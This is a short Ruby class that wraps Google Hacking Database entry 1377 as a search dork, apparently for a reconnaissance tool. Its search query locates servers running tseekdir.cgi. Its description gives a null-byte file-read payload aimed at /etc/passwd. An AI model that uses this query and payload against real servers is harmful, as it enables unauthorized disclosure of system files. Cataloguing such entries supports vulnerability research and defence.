module Dorks
   class Dork1377 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1377",
            ghdb_url: "https://www.exploit-db.com/ghdb/1377",
            severity: "5",
            category: "advisories_and_vulnerabilities",
            publish_date: "2006-05-22",
            author: "anonymous",
            dork: <<~EDORK,
allinurl:tseekdir.cgi
EDORK
            description: <<~EDESC
tseekdir.cgi?location=FILENAME%00eg:tseekdir.cgi?location=/etc/passwd%00basically any file on the server can be viewed by inserting a null (%00) into the URL.credit to duritohttp://seclists.org/bugtraq/2006/May/0184.html
EDESC
         })

      end
   end
end
